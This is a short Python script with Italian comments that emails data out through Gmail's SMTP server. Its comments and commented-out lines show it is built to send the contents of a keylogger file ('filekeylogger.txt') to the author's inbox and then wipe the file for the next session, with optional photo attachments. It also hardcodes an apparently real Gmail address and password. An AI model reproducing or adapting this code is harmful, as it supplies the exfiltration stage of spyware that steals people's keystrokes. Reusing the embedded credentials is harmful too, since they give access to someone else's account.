import smtplib
from email.message import EmailMessage
import imghdr


msg = EmailMessage()
msg['Subject'] = "Titolo dell'email"
msg['From'] = "tramorio84@gmail.com"
msg['To'] = "tramorio84@gmail.com"

# Il messaggio email può essere anche l'intero contenuto del Keylogger
# che poi va svuotato per essere riempito nella nuova sessione

##keylog = open("filekeylogger.txt")
##
msg.set_content("Poi saremo degli Dei!!")
##


# Se voglio mandare foto...

##files = ["foto1 che voglio mandare","foto2 che voglio mandare"]
##for file in files:
##    with open(file, 'rb') as f:
##        file_data = f.read()
##        file_type = imghdr.what(f.name)
##        file_name = f.name
##
##    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

    
with smtplib.SMTP("smtp.gmail.com",587) as smtp:

    smtp.starttls()
    
    smtp.login("tramorio84@gmail.com","Politto%9")

    smtp.send_message(msg)
    
##keylog.close()
##keylog = open("filekeylogger.txt","w")
##keylog.write("")
##keylog.close()
